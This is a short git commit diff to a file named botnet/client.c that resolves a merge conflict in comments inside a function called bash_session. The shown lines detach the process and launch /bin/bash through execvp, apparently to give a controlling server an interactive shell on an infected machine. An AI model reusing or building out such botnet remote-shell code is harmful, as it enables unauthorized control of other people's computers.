5942a5b65437590a67a4f5297caf28bac6e8933f
Cody <ibobo@protonmail.com>
2020-05-27 23:23:03 +0100

    removed additional files

--- botnet/client.c
+++ botnet/client.c
@@ -211,12 +211,7 @@ pid_t bash_session(connection server_con)
     setsid();
     ioctl(0, TIOCSCTTY, 1);
 
-<<<<<<< HEAD
     // Execvp is a bit funky with args, so create an empty array
-=======
-    // Execvp is a bit funky with args, so create an array with only bash in it
-    // This took like 3 days to work out...
->>>>>>> 962e9733de22e9ea6ac632df2afd193ede5390fb
     char *args[] = {"/bin/bash", NULL};
     execvp(args[0], args);
 
